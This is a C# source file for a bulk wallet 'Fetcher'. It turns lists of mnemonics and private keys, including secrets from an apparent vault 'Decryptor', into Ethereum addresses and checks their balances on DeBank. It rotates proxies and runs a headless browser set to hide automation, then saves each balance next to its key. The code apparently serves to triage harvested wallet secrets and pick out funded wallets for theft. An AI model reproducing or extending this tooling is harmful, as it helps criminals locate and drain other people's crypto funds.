using Nethereum.HdWallet;
using Nethereum.Web3.Accounts;
using PuppeteerSharp;
using System.Collections.Concurrent;
using static Structures.Balances;
using static Structures;
using Leaf.xNet;
using Newtonsoft.Json.Linq;
using Spectre.Console;
using static Utils;

public class Fetchers
{
    private static readonly int DCTimeout = 1450;
    private static readonly int DRWTimeout = 1450;

    public class DeBank
    {
        public bool BrowserSupported = true;
        public bool WebSupported = true;

        public class BMethod
        {
            private IBrowser? browser;
            private IPage? page;
            public string Address;
            public bool IsConnected = false;
            public bool CBStatus = false;
            public bool LBStatus = false;
            public bool ODPStatus = false;

            public BMethod(string address, bool autoconnect = true)
            {
                Address = address;
                if (autoconnect is true)
                    Connect().GetAwaiter().GetResult();
            }

            private async Task<bool> CheckBrowser()
            {
                try
                {
                    using var browserFetcher = new BrowserFetcher();
                    var RevisionData = await browserFetcher.DownloadAsync(BrowserFetcher.DefaultChromiumRevision);
                    if (RevisionData.Downloaded is false) throw new Exception("Browser wasn't downloaded successfully (network error or timeout)");
                    CBStatus = true;
                    return true;
                }

                catch (Exception err)
                {
                    throw new Exception("CheckBrowser()", err);
                }
            }

            private async Task<bool> LaunchBrowser()
            {
                try
                {
                    browser = await Puppeteer.LaunchAsync(new LaunchOptions()
                    {
                        Headless = true,
                        Args = new[] {
                        "--disable-blink-features=AutomationControlled",
                        "--disable-background-timer-throttling",
                        "--disable-background-networking",
                        "--disable-gpu",
                        "--disable-extensions",
                        "--disable-plugins",
                        "--disable-breakpad",
                        "--disable-sync",
                        "--disable-translate",
                        "--disable-webgl",
                        "--disable-default-apps",
                        "--disable-infobars",
                        "--disable-features=site-per-process",
                        "--disable-hang-monitor",
                        "--disable-ipc-flooding-protection",
                        "--disable-renderer-backgrounding",
                        "--disable-software-rasterizer",
                        "--disable-notifications",
                        "--disable-voice-input",
                        "--disable-popup-blocking",
                        "--disable-prompt-on-repost",
                        "--disable-client-side-phishing-detection",
                        "--disable-component-extensions-with-background-pages",
                        "--no-sandbox",
                        "--no-experiments",
                        "--no-first-run",
                        "--disable-logging",
                        "--cpu-throttling-rate=30",
                        "--memory-limit=256",
                        "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
                    },
                        DefaultViewport = new ViewPortOptions { Width = 1280, Height = 720 }
                    });

                    if (browser is null) throw new Exception("Browser wasn't started successfully");
                    LBStatus = true;
                    return true;
                }

                catch (Exception err)
                {
                    throw new Exception("LaunchBrowser()", err);
                }
            }

            private async Task<bool> OpenDeBankProfile(string address)
            {
                try
                {
                    if (browser is null) throw new Exception("Browser wasn't started successfully");
                    page = await browser.NewPageAsync();
                    await page.GoToAsync($"https://debank.com/profile/{address}");
                    var UpdateElement = await page.WaitForXPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[2]/div/div[2]/div[2]/span/span");
                    if (UpdateElement is null) throw new Exception("DeBank Profile update element XPath is incorrect or timeouted");
                    ODPStatus = true;
                    return true;
                }

                catch (Exception err)
                {
                    await Close();
                    throw new Exception("OpenDeBankProfile()", err);
                }
            }

            public async Task<bool> IsEmpty()
            {
                try
                {
                    if (!IsConnected) throw new Exception("Not connected to DeBank Profile");
                    if (page is null) throw new Exception("Profile page wasn't opened");

                    var PortofolioXPath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div");
                    var PortofolioJSHandle = await PortofolioXPath[0].GetPropertyAsync("childNodes");
                    var PortofolioСhildNodes = await (await PortofolioJSHandle.EvaluateFunctionHandleAsync("nodes => Array.from(nodes)")).GetPropertiesAsync();
                    var EmptyClass = PortofolioСhildNodes.Any(el =>
                    {
                        var ClassNameHandle = el.Value.GetPropertyAsync("className").GetAwaiter().GetResult();
                        if (ClassNameHandle.JsonValueAsync().GetAwaiter().GetResult() is null) return false;
                        var className = ClassNameHandle.JsonValueAsync<string>().GetAwaiter().GetResult();
                        return className.Contains("Portfolio_noResult");
                    });

                    return EmptyClass;
                }

                catch (Exception err)
                {
                    await Close();
                    throw new Exception("IsEmpty()", err);
                }

            }

            public async Task<bool> Connect()
            {
                if (IsConnected is false)
                {
                    try
                    {
                        bool CBStatus = await CheckBrowser();
                        bool LBStatus = await LaunchBrowser();
                        bool ODPStatus = await OpenDeBankProfile(Address);
                        bool Status = CBStatus && LBStatus && ODPStatus;
                        IsConnected = Status;

                        return Status;
                    }

                    catch (Exception err)
                    {
                        Console.WriteLine(err);
                        await Close();
                        throw;
                    }
                }

                else
                    return true;
            }

            public async Task<double> GetTotalBalance()
            {
                try
                {
                    if (!IsConnected) throw new Exception("Not connected to DeBank Profile");
                    if (page is null) throw new Exception("Profile page wasn't opened");

                    var TotalBalanceXPath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[2]/div/div[1]/div[1]/div[2]/div[1]/div");
                    var TotalBalanceJSHandle = await TotalBalanceXPath[0].GetPropertyAsync("firstChild");
                    var TotalBalance = double.Parse(((string)await (await TotalBalanceJSHandle.GetPropertyAsync("textContent")).JsonValueAsync())
                        .Replace(",", "")
                        .Replace("$", "")
                        .Trim());

                    return TotalBalance;
                }

                catch (Exception err)
                {
                    throw new Exception("GetTotalBalance()", err);
                }
            }

            public async Task<List<Chain>?> GetChainsBalances()
            {
                try
                {
                    if (!IsConnected) throw new Exception("Not connected to DeBank Profile");
                    if (page is null) throw new Exception("Profile page wasn't opened");

                    var TotalBalance = await GetTotalBalance();
                    if (TotalBalance == 0.00) return null;

                    var Empty = await IsEmpty();
                    if (Empty) return null;

                    var PortofolioXPath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div");
                    if (PortofolioXPath is null) return null;
                    var PortofolioСhildNodes = Utils.Node.GetChildNodes(PortofolioXPath[0]);
                    if (PortofolioСhildNodes is null) return null;

                    var PortofolioSummary = Utils.Node.FindByClass(PortofolioСhildNodes, "Portfolio_collect");
                    if (PortofolioSummary is null) return null;
                    var PortofolioSummaryСhildNodes = Utils.Node.GetChildNodes(PortofolioSummary);
                    if (PortofolioSummaryСhildNodes is null) return null;

                    var PortofolioUsedChains = Utils.Node.FindByClass(PortofolioSummaryСhildNodes, "AssetsOnChain");
                    if (PortofolioUsedChains is null) return null;
                    var PortofolioUsedChainsChildNodes = Utils.Node.GetChildNodes(PortofolioUsedChains);
                    if (PortofolioUsedChainsChildNodes is null) return null;

                    var Chains = new List<Structures.Balances.Chain>();
                    foreach (var IChain in PortofolioUsedChainsChildNodes)
                    {
                        var IChainChildNodes = Utils.Node.GetChildNodes(IChain);
                        if (IChainChildNodes is null) continue;

                        var ChainInfo = Utils.Node.FindByClass(IChainChildNodes, "chainInfo");
                        if (ChainInfo is null) continue;

                        var ChainInfoChildNodes = Utils.Node.GetChildNodes(ChainInfo);
                        if (ChainInfoChildNodes is null) continue;

                        var ChainName = Utils.Node.FindByClass(ChainInfoChildNodes, "chainName");
                        if (ChainName is null) continue;

                        var ChainBalanceChildNodes = Utils.Node.GetChildNodes(ChainInfoChildNodes[1]);
                        if (ChainBalanceChildNodes is null) continue;

                        var ChainBalance = Utils.Node.FindByClass(ChainBalanceChildNodes, "usdValue");
                        if (ChainBalance is null) continue;

                        var IsValueParsed = double.TryParse((await ChainBalance.GetPropertyAsync("innerText")).JsonValueAsync().GetAwaiter().GetResult().ToString()?.Replace("$", "").Replace(",", ""), out double Value);
                        if (IsValueParsed is false) continue;
                        if (Value == 0) continue;

                        var Name = (await ChainName.GetPropertyAsync("innerText"))
                            .JsonValueAsync().GetAwaiter().GetResult()
                            .ToString()?
                            .Replace("Assets on", "")
                            .Trim()
                            .ToLower();

                        if (Name is null) continue;
                        var IsInDebankDictionary = Structures.DeBank.BrowserChains.Any(el => el.Key == Name);
                        if (IsInDebankDictionary is true)
                        {
                            await ChainInfo.EvaluateFunctionAsync("element => element.click()");
                            Thread.Sleep(50);
                            var ChainPortofolioXpath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div/div[2]");
                            var ChainPortofolioСhildNodes = Utils.Node.GetChildNodes(ChainPortofolioXpath[0]);
                            if (ChainPortofolioСhildNodes is null) continue;
                            var ChainShowAllAsstes = Utils.Node.FindByClass(ChainPortofolioСhildNodes, "projectsShowAll");
                            if (ChainShowAllAsstes is not null)
                            {
                                await ChainShowAllAsstes.EvaluateFunctionAsync("element => element.click()");
                                ChainPortofolioXpath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div/div[2]");
                                ChainPortofolioСhildNodes = Utils.Node.GetChildNodes(ChainPortofolioXpath[0]);
                                if (ChainPortofolioСhildNodes is null) continue;
                            }
                            var ChainPools = Utils.Node.FindByClass(ChainPortofolioСhildNodes, "projectGrid");
                            if (ChainPools is null) continue;
                            var ChainPoolsChildNodes = Utils.Node.GetChildNodes(ChainPools);
                            if (ChainPoolsChildNodes is null) continue;

                            var Tokens = new List<Token>();
                            var Pools = new List<Pool>();

                            PortofolioXPath = await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div");
                            var PortofolioNodes = Utils.Node.GetChildNodes(PortofolioXPath[0]);
                            IJSHandle? ChainTokensContainer = null;

                            if (PortofolioNodes is not null)
                            {
                                var DefiOverviewNode = Utils.Node.FindByClass(PortofolioNodes, "defiItem");
                                if (DefiOverviewNode is not null)
                                {
                                    var DefiOverviewNodes = Utils.Node.GetChildNodes(DefiOverviewNode);
                                    if (DefiOverviewNodes is not null)
                                    {
                                        foreach (var PortofolioNode in DefiOverviewNodes)
                                        {
                                            if (PortofolioNode is null) continue;
                                            var DefiItemsNode = Utils.Node.GetChildNodes(PortofolioNode);
                                            if (DefiItemsNode is null) continue;
                                            var ItemBlock = Utils.Node.FindByClass(DefiItemsNode, "TokenWallet_container");

                                            if (ItemBlock is not null)
                                            {
                                                ChainTokensContainer = ItemBlock;
                                                break;
                                            }
                                        }
                                    }
                                }
                            };

                            if (ChainTokensContainer is not null)
                            {
                                var ChainTokensChildNodes = Utils.Node.GetChildNodes(ChainTokensContainer);
                                if (ChainTokensChildNodes is not null)
                                {
                                    var ChainTokensShowAll = Utils.Node.FindByClass(ChainTokensChildNodes, "showAll");
                                    if (ChainTokensShowAll is not null)
                                    {
                                        await ChainTokensShowAll.EvaluateFunctionAsync("element => element.click()");
                                        Thread.Sleep(50);
                                    }

                                    var ChainTokensXPath = (await page.XPathAsync("/html/body/div[1]/div/div[2]/div[1]/div[3]/div/div[4]/div[1]/div[2]/div[1]/div/div[2]"))[0];
                                    var ChainTokensWrappedRows = Utils.Node.GetChildNodes(ChainTokensXPath);
                                    var ChainTokensUnwrappedRows = new List<IJSHandle>();

                                    if (ChainTokensWrappedRows is not null)
                                    {
                                        foreach (var WrappedRow in ChainTokensWrappedRows)
                                        {
                                            if (WrappedRow is null) continue;
                                            var UnwrappedRow = Utils.Node.GetChildNodes(WrappedRow)?[0];
                                            if (UnwrappedRow is null) continue;
                                            ChainTokensUnwrappedRows.Add(UnwrappedRow);
                                        }
                                    }

                                    if (ChainTokensUnwrappedRows.Count > 0)
                                    {
                                        foreach (var ChainToken in ChainTokensUnwrappedRows)
                                        {
                                            var ChainRows = Utils.Node.GetChildNodes(ChainToken);
                                            if (ChainRows is null) continue;
                                            var TokenName = (await ChainRows[0].GetPropertyAsync("innerText"))?
                                                .JsonValueAsync()
                                                .GetAwaiter()
                                                .GetResult()?
                                                .ToString();
                                            var StringTokenAmount = (await ChainRows[2].GetPropertyAsync("innerText"))?
                                                .JsonValueAsync()
                                                .GetAwaiter()
                                                .GetResult()?
                                                .ToString()?
                                                .Trim()?
                                                .Replace(",", "")?
                                                .Replace(".", ",");
                                            var StringTokenValue = (await ChainRows[3].GetPropertyAsync("innerText"))?
                                                .JsonValueAsync()
                                                .GetAwaiter()
                                                .GetResult()?
                                                .ToString()?
                                                .Trim()?
                                                .Replace(",", "")?
                                                .Replace("$", "")?
                                                .Replace("<", "")?
                                                .Replace(".", ",");
                                            if (StringTokenAmount is not null)
                                            {
                                                if (StringTokenAmount.Contains("B"))
                                                {
                                                    StringTokenAmount = StringTokenAmount.Replace("B", "");
                                                    var IsSTAParsed = double.TryParse(StringTokenAmount, out double STADouble);
                                                    if (IsSTAParsed is true)
                                                    {
                                                        STADouble *= 1000000000;
                                                        StringTokenAmount = STADouble.ToString();
                                                    }
                                                }

                                                if (StringTokenAmount.Contains("e"))
                                                {
                                                    var SplittedTokenAmount = StringTokenAmount.Split("e");
                                                    StringTokenAmount = SplittedTokenAmount[0];
                                                    var IsSTAParsed = double.TryParse(StringTokenAmount, out double STADouble);
                                                    if (IsSTAParsed is true)
                                                    {
                                                        STADouble *= Math.Pow(STADouble, int.Parse(SplittedTokenAmount[1]));
                                                        StringTokenAmount = STADouble.ToString();
                                                    }
                                                }
                                            }

                                            var IsTokenAmountParsed = double.TryParse(StringTokenAmount, out double TokenAmount);
                                            var IsTokenValueParsed = double.TryParse(StringTokenValue, out double TokenValue);

                                            if (TokenName is not null && IsTokenValueParsed is true && IsTokenAmountParsed is true && TokenValue > 1)
                                            {
                                                var Token = new Token()
                                                {
                                                    Name = TokenName,
                                                    Value = TokenValue,
                                                    Amount = TokenAmount,
                                                    Chain = Structures.DeBank.BrowserChains[Name]
                                                };

                                                Tokens.Add(Token);
                                            }
                                        }
                                    }
                                }
                            };

                            foreach (var ChainPool in ChainPoolsChildNodes)
                            {
                                var ChainPoolData = Utils.Node.GetChildNodes(ChainPool)?[0];
                                if (ChainPoolData is null) continue;
                                var ChainPoolAssetData = Utils.Node.GetChildNodes(ChainPoolData)?[1];
                                if (ChainPoolAssetData is null) continue;
                                var ChainPoolAssetDataChildNodes = Utils.Node.GetChildNodes(ChainPoolAssetData);
                                if (ChainPoolAssetDataChildNodes is null) continue;
                                var PoolName = (await ChainPoolAssetDataChildNodes[0].GetPropertyAsync("innerText"))
                                    .JsonValueAsync().GetAwaiter().GetResult()
                                    .ToString()?
                                    .Trim();

                                if (PoolName is null || PoolName == "Wallet") continue;
                                var IsPoolValueParsed = double.TryParse((await ChainPoolAssetDataChildNodes[1].GetPropertyAsync("innerText")).JsonValueAsync().GetAwaiter().GetResult().ToString()?.Replace("$", "").Replace(",", ""), out double PoolValue);
                                if (IsPoolValueParsed is false) continue;
                                if (PoolValue == 0) continue;

                                var Pool = new Pool()
                                {
                                    Name = PoolName,
                                    Value = PoolValue,
                                    Chain = Structures.DeBank.BrowserChains[Name]
                                };

                                Pools.Add(Pool);

                                if (ChainPoolsChildNodes.IndexOf(ChainPool) == (ChainPoolsChildNodes.Count - 1))
                                    await ChainInfo.EvaluateFunctionAsync("element => element.click()");
                            }

                            var Chain = new Chain()
                            {
                                Name = Structures.DeBank.BrowserChains[Name],
                                Balances = new()
                                {
                                    Value = Value,
                                    Pools = Pools,
                                    Tokens = Tokens
                                }
                            };

                            Chains.Add(Chain);
                        }
                    }

                    return Chains;
                }

                catch (Exception err)
                {
                    await Close();
                    throw new Exception("GetChains()", err);
                }
            }

            public async Task<Total> GetAll()
            {
                var Total = new Total()
                {
                    Address = Address,
                    Value = await GetTotalBalance(),
                    Chains = await GetChainsBalances()
                };

                return Total;
            }

            public async Task Close()
            {
                if (page is not null) await page.CloseAsync();
                if (browser is not null) await browser.CloseAsync();
            }
        }

        public class WMethod
        {
            public static double? GetNetworth(string Address, bool ForceRetry = false, Proxy? Proxy = null)
            {
                double? Networth = null;

                var Request = new HttpRequest();

                if (Proxy is not null) Request.Proxy = GetProxyClient(Proxy.Value);
                Request.AcceptEncoding = "none";
                Request.Proxy.ConnectTimeout = DCTimeout;
                Request.Proxy.ReadWriteTimeout = DRWTimeout;

                try
                {
                    HttpResponse? Response;

                    if (Proxy is not null)
                        Response = (HttpResponse?)ProxyScrapper.Validate(Proxy.Value, ResourceUrl: $"https://api.debank.com/user/addr?addr={Address}");
                    else 
                        Response = Request.Get($"https://api.debank.com/user/addr?addr={Address}");

                    if (Response is null) throw new Exception("Null response");

                    var ResponseObject = JObject.Parse(Response.ToString());
                    var ResponseUSDValue = ResponseObject["data"]?["desc"]?["usd_value"];
                    if (ResponseUSDValue is not null) Networth = double.Parse(ResponseUSDValue.ToString());
                }

                catch
                {

                }

                if (Networth is null && ForceRetry is true) 
                {
                    return GetNetworth(Address, Proxy: Proxy);
                }

                return Networth;
            }

            public static List<string>? GetUserChains(string Address, bool ForceRetry = false)
            {
                List<string>? UsedChains = null;

                var Proxies = Utils.GrabProxiesFromSettings();
                if (Proxies is not null)
                {
                    foreach (var Proxy in Proxies)
                    {
                        var Request = new HttpRequest();
                        Request.Proxy = Utils.GetProxyClient(Proxy);
                        Request.AcceptEncoding = "none";
                        Request.Proxy.ConnectTimeout = DCTimeout;
                        Request.Proxy.ReadWriteTimeout = DRWTimeout;

                        try
                        {
                            var Response = Request.Get($"https://api.debank.com/user/addr?addr={Address}");
                            var ResponseObject = JObject.Parse(Response.ToString());
                            var ResponseUsedChains = ResponseObject["data"]?["used_chains"];
                            if (ResponseUsedChains is not null) UsedChains = ResponseUsedChains.ToList().Select(el => el.ToString()).ToList();
                            break;
                        }

                        catch
                        {
                            continue;
                        }
                    }
                }

                if (UsedChains is null && ForceRetry is true)
                {
                    return GetUserChains(Address, true);
                }

                return UsedChains;
            }

            public static List<Token>? GetUserChainTokens(string Address, string ChainId, bool ForceRetry = false)
            {
                List<Token>? Tokens = null;

                var Proxies = Utils.GrabProxiesFromSettings();
                if (Proxies is not null)
                {
                    foreach (var Proxy in Proxies)
                    {
                        var Request = new HttpRequest();
                        Request.Proxy = Utils.GetProxyClient(Proxy);
                        Request.AcceptEncoding = "none";
                        Request.Proxy.ConnectTimeout = DCTimeout;
                        Request.Proxy.ReadWriteTimeout = DRWTimeout;

                        try
                        {
                            var Response = Request.Get($"https://api.debank.com/user/addr?addr={Address}");
                            var ResponseObject = JObject.Parse(Response.ToString());
                            var ResponseData = ResponseObject["data"];
                            if (ResponseData is not null && ResponseData.HasValues)
                                Tokens = ResponseData.ToList().Select(token => {
                                    var Token = new Token();
                                    var STokenAmount = token["amount"]?.ToString();
                                    var STokenChain = token["chain"]?.ToString();
                                    var STokenPrice = token["price"]?.ToString();
                                    var STokenName = token["optimized_symbol"]?.ToString();
                                    
                                    double TokenBalance = 0;
                                    double TokenAmount = 0;
                                    double TokenPrice = 0;

                                    if (STokenAmount is not null && STokenPrice is not null)
                                    {
                                        TokenAmount = double.Parse(STokenAmount.ToString());
                                        TokenPrice = double.Parse(STokenPrice.ToString());
                                        TokenBalance = TokenAmount * TokenPrice;
                                    }

                                    Token.Value = TokenBalance;
                                    Token.Chain = STokenChain is null ? Chains.Unknown : Structures.DeBank.RequestChains[STokenChain];
                                    Token.Name = STokenName is null ? "Unknown" : STokenName;
                                    Token.Amount = TokenAmount;

                                    return Token;
                                }).Where(token => token.Chain is not Chains.Unknown && token.Name != "Unknown" && token.Value != 0).ToList();
                            break;
                        }

                        catch
                        {
                            continue;
                        }
                    }

                    if (Tokens is null && ForceRetry is true)
                    {
                        return GetUserChainTokens(Address, ChainId, true);
                    }
                }

                return Tokens;
            }
        }
    }

    public class Ronin
    {
        public bool BrowserSupported = false;
        public bool WebSupported = true;

        public class WMethod
        {
            public static double? GetNetworth(string Address, bool ForceRetry = true, int Retries = 0)
            {
                double? Networth = null;

                var Proxies = GrabProxiesFromSettings();
                if (Proxies is not null)
                {
                    foreach (var Proxy in Proxies)
                    {
                        var Request = new HttpRequest();
                        Request.Proxy = GetProxyClient(Proxy);
                        Request.AcceptEncoding = "none";
                        Request.Proxy.ConnectTimeout = DCTimeout;
                        Request.Proxy.ReadWriteTimeout = DRWTimeout;

                        try
                        {
                            var Response = Request.Get($"https://explorerv3-api.roninchain.com/address/{Address}");
                            var ResponseObject = JObject.Parse(Response.ToString());
                            var ResponseUSDValue = ResponseObject["networth"];
                            if (ResponseUSDValue is not null) Networth = double.Parse(ResponseUSDValue.ToString());
                            break;
                        }

                        catch
                        {
                            continue;
                        }
                    }
                }

                if (Networth is null && ForceRetry is true)
                {
                    return GetNetworth(Address);
                }

                return Networth;
            }
        }
    }

    public static Total? WFetchWallet(object Item, Proxy? Proxy = null)
    {
        var Total = new Total();
        Account? NAccount = null;

        if (Item is StringWallet StringWallet)
        {
            if (StringWallet.Type is StringWalletTypes.Mnemonic)
            {
                var NWallet = new Wallet(StringWallet.Value, "");
                if (NWallet is null) return null;
                NAccount = NWallet.GetAccount(0);
                Total.Mnemonic = new() { Type = "Default", Value = StringWallet.Value };
            }

            else if (StringWallet.Type is StringWalletTypes.PrivateKey)
            {
                NAccount = new Account(StringWallet.Value);
                Total.PrivateKey = new() { Type = "Default", Value = StringWallet.Value };
            }
        }

        else if (Item is Mnemonic Mnemonic)
        {
            if (Mnemonic.Type != "Default") return null;
            var NWallet = new Wallet(Mnemonic.Value, "");
            NAccount = NWallet.GetAccount(0);
            Total.Mnemonic = Mnemonic;
        }

        else if (Item is PrivateKey Key)
        {
            if (Key.Type != "Default") return null;
            NAccount = new Account(Key.Value);
            Total.PrivateKey = Key;
        }

        else return null;

        if (NAccount is null)
        {
            return null;
        };

        try
        {
            var WDBNetworth = DeBank.WMethod.GetNetworth(NAccount.Address, Proxy: Proxy);
            //var WRNetworth = Ronin.WMethod.GetNetworth(NAccount.Address);
            var WTNetworth = WDBNetworth; //+ WRNetworth;

            Total = new Total()
            {
                Address = NAccount.Address,
                Value = WTNetworth is null ? 0 : Math.Round(WTNetworth.Value, 2),
                PrivateKey = Total.PrivateKey is null ? null : Total.PrivateKey,
                Mnemonic = Total.Mnemonic is null ? null : Total.Mnemonic,
                Status = WTNetworth is not null
            };

            if (WTNetworth is null) return null;

            return Total;
        }

        catch
        {
            return null;
        };
    }

    public static async Task<Total?> BFetchWallet(object Item)
    {
        var Total = new Total();
        Account? NAccount = null;

        if (Item is StringWallet StringWallet)
        {
            if (StringWallet.Type is StringWalletTypes.Mnemonic)
            {
                var NWallet = new Wallet(StringWallet.Value, "");
                if (NWallet is null) return null;
                NAccount = NWallet.GetAccount(0);
                Total.Mnemonic = new() { Type = "Default", Value = StringWallet.Value };
            }

            else if (StringWallet.Type is StringWalletTypes.PrivateKey)
            {
                NAccount = new Account(StringWallet.Value);
                Total.PrivateKey = new() { Type = "Default", Value = StringWallet.Value };
            }
        }

        else if (Item is Mnemonic Mnemonic)
        {
            if (Mnemonic.Type != "Default") return null;
            var NWallet = new Wallet(Mnemonic.Value, "");
            NAccount = NWallet.GetAccount(0);
            Total.Mnemonic = Mnemonic;
        }

        else if (Item is PrivateKey Key)
        {
            if (Key.Type != "Default") return null;
            NAccount = new Account(Key.Value);
            Total.PrivateKey = Key;
        }

        else return null;

        if (NAccount is null)
        {
            return null;
        };

        try
        {
            var Profile = new DeBank.BMethod(NAccount.Address);
            var WTotal = await Profile.GetAll();
            await Profile.Close();

            Total = new Total()
            {
                Address = WTotal.Address,
                Chains = WTotal.Chains,
                Value = WTotal.Value,
                PrivateKey = Total.PrivateKey is null ? null : Total.PrivateKey,
                Mnemonic = Total.Mnemonic is null ? null : Total.Mnemonic,
            };

            return Total;
        }

        catch
        {
            return null;
        };
    }

    public static async Task<List<Total>> BFetchSecret(Vault.Secret Secret)
    {
        var Balances = new List<Total>();
        var Combined = new List<object>();

        Secret.Mnemonics?.ForEach(mnemonic => Combined.Add(mnemonic));
        Secret.PrivateKeys?.ForEach(key => Combined.Add(key));

        if (Combined.Count == 0) return Balances;

        foreach (var Item in Combined)
        {
            DateTime TryTime = DateTime.Now;
            var ItemData = await BFetchWallet(Item);
            if (ItemData is null) continue;
            Balances.Add(ItemData.Value);
        }

        return Balances;
    }

    public static async Task<List<Total>> BFetchStrings(StringSecret StringSecret)
    {
        var Balances = new List<Total>();
        var Secret = new Vault.Secret
        {
            Mnemonics = new(),
            PrivateKeys = new()
        };

        if (StringSecret.PrivateKeys is not null) StringSecret.PrivateKeys.ForEach(key => Secret.PrivateKeys.Add(new() { Type = "Default", Value = key }));
        if (StringSecret.Mnemonics is not null) StringSecret.Mnemonics.ForEach(mnemonic => Secret.Mnemonics.Add(new() { Type = "Default", Value = mnemonic }));

        Balances = await BFetchSecret(Secret);

        return Balances;
    }

    public static List<Total> Call(string WorkPath, string ResultsPath, List<Vault.Secret>? Secrets = null, bool FromDecryptor = false)
    {
        var Balances = new List<Total>();
        var Settings = new IniFile("Settings.ini");
        string? Threads = Settings.Read("Fetcher", "Threads");
        Threads ??= "1";
        var CallTime = DateTime.Now;
        var ItemList = new List<object>();
        bool ForceStop = false;

        AnsiConsole.MarkupLine($"{(FromDecryptor is true ? "\n" : "")} [mediumpurple]#[/] Fetcher started");
        Console.Title = "~ Fetcher";
        var LinesSpinner = new CustomSpinners.Lines();

        AnsiConsole.Status()
            .Spinner(LinesSpinner)
            .SpinnerStyle(Style.Parse("mediumpurple"))
            .Start(" [mediumpurple]@[/] Working...", ctx =>
            {
                if (Secrets is null && FromDecryptor is false)
                {
                    if (File.Exists(WorkPath))
                    {
                        ctx.Status = " [mediumpurple]@[/] Collecting items from working path...";
                        var StringWallets = GrabStringWallets(WorkPath);

                        if (StringWallets is not null)
                        {
                            StringWallets.ForEach(wallet => ItemList.Add(wallet));
                        }

                        else
                        {
                            AnsiConsole.MarkupLine($" [black on plum2] No any items was found in working path [/]");
                            ForceStop = true;
                        }
                    }

                    else
                    {
                        AnsiConsole.MarkupLine(" [black on plum2] Working path file is not exists [/]");
                        ForceStop = true;
                    }
                }

                else if (Secrets is not null && FromDecryptor is true)
                {
                    ctx.Status = " [mediumpurple]@[/] Collecting items from secrets...";

                    Secrets.ForEach(secret =>
                    {
                        secret.Mnemonics?.ForEach(mnemonic => { if (!ItemList.Contains(mnemonic)) ItemList.Add(mnemonic); });
                        secret.PrivateKeys?.ForEach(key => { if (!ItemList.Contains(key)) ItemList.Add(key); });
                    });
                }

                else if (Secrets is null && FromDecryptor is true)
                {
                    AnsiConsole.MarkupLine(" [black on plum2] Nothing to fetch [/]");
                    ForceStop = true;
                }

                if (ForceStop is false)
                {
                    ctx.Status = " [mediumpurple]@[/] Fetching...";
                    int ProcessorCount = Environment.ProcessorCount;
                    Console.Title = $"~ Fetcher {{{ItemList.Count} items}}";
                    var Partitions = Partitioner.Create(ItemList).GetPartitions(int.Parse(Threads));
                    var Proxies = Utils.GrabProxiesFromSettings();
                    var Tasks = new List<Task>();
                    var Semaphore = new SemaphoreSlim(int.Parse(Threads));

                    int FetchedCount = 0;
                    int LastProxyIndex = 0;

                    foreach (var Partition in Partitions)
                    {
                        var task = Task.Run(() =>
                        {
                            while (Partition.MoveNext())
                            {
                                Semaphore.Wait();
                                try
                                {
                                    if (Proxies is not null && LastProxyIndex >= Proxies.Count) LastProxyIndex = 0;

                                    var Item = Partition.Current;
                                    Total? WBalance = null;

                                    while (true)
                                    {
                                        WBalance = WFetchWallet(Item, Proxies?[LastProxyIndex]);
                                        if (WBalance is null)
                                        {
                                            LastProxyIndex++;
                                            continue;
                                        }

                                        else break;
                                    }

                                    LastProxyIndex++;

                                    if (WBalance is not null)
                                    {
                                        Balances.Add(WBalance.Value);
                                        var OutputColor = WBalance.Value.Value > 0 ? "mediumpurple" : "plum2";
                                        Recorders.Universal.Record(ResultsPath, WBalance.Value);
                                        AnsiConsole.MarkupLine($" [{OutputColor}]>[/] Address [{OutputColor}]{{{WBalance.Value.Address}}}[/] balance is [{OutputColor}]{{{WBalance.Value.Value}$}}[/]");
                                    }
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e);
                                }

                                FetchedCount++;
                                Console.Title = $"~ Fetcher {{{FetchedCount}/{ItemList.Count} items}}";

                                Semaphore.Release();
                            }
                        });

                        Tasks.Add(task);
                    }

                    Task.WaitAll(Tasks.ToArray());
                    AnsiConsole.MarkupLine($" [mediumpurple]#[/] Fetching is done");

                    if (Balances.Count > 0)
                    {
                        AnsiConsole.WriteLine();
                        var BChart = new BarChart();
                        BChart.Width = 60;
                        var WalletsData = new Dictionary<string, int>();
                        var EmptyWallets = Balances.Where(el => el.Value == 0).ToList();
                        var BalancesWallets = Balances.Where(el => el.Value > 0).ToList();

                        if (EmptyWallets.Count > 0) WalletsData.Add("Empty", EmptyWallets.Count);
                        if (BalancesWallets.Count > 0) WalletsData.Add("With balance", BalancesWallets.Count);

                        var OrderedWalletsData = WalletsData.OrderByDescending(el => el.Value);
                        var SDColors = new Dictionary<int, Color>()
                        {
                            { 1, Color.Plum1 },
                            { 2, Color.Plum2 }
                        };

                        var CurrentDataIndex = 1;
                        foreach (var OWD in OrderedWalletsData)
                        {
                            BChart.AddItem($" {OWD.Key}", OWD.Value, SDColors[CurrentDataIndex]);
                            CurrentDataIndex++;
                        }

                        AnsiConsole.Write(BChart);
                    }
                }
            });

        return Balances;
    }
}